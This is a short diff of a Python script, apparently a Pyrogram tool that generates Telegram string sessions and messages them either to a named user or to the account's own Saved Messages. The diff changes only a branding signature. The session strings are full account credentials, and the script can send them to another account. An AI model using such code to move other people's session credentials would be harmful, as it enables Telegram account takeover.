@@ -16,9 +16,9 @@ try:
             sess = str(s)
             if whom:
                 id = RiZoeL.get_users(whom).id
-                RiZoeL.send_message(id, f"**Pyrogram String Session** \n\n `{sess}` \n\n © ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
+                RiZoeL.send_message(id, f"**Pyrogram String Session** \n\n `{sess}` \n\n © ⚡️𝐌 𝐎 𝐎 𝐍⚡️")
             else:
-                RiZoeL.send_message("me", f"**Pyrogram String Session** \n\n `{sess}` \n\n ©⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
+                RiZoeL.send_message("me", f"**Pyrogram String Session** \n\n `{sess}` \n\n ©⚡️𝐌 𝐎 𝐎 𝐍⚡️")
        
      if whom:
            print(f"All Session has been sent to {whom}")
